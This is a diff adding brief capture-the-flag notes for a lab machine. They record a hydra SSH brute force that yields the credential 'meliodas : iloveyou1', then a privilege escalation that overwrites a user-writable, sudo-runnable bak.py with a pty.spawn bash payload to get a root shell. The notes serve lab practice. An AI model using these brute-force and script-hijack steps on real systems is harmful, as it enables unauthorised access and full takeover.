@@ -1,0 +1,36 @@
+10.10.174.38
+
+User-agent: rockyou 
+Disallow: /
+
+possible usernames in the machine
+www-data
+root
+Anonymous 
+meliodas
+
+bruteforce meliodas ssh with hydra 
+meliodas : iloveyou1
+
+ssh into meliodas
+grab the user.txt
+
+privilage escalation
+####################
+1) sudo -l
+2) there is a bak.py script in the home directory of meliodas which is owned by root but meliods has the write permission on the script
+3) lets remove it and recreate it with python code 
+4) rm bak.py
+5) cat > bak.py << Eof
+	 #! python
+	import pty
+	pty.spawn("/bin/bash")
+	EOF
+6) run it with sudo
+7) sudo python3 bak.py
+8) we have succesfully elevated our privilage
+####################
+
+grab the root.txt from /root
+
+
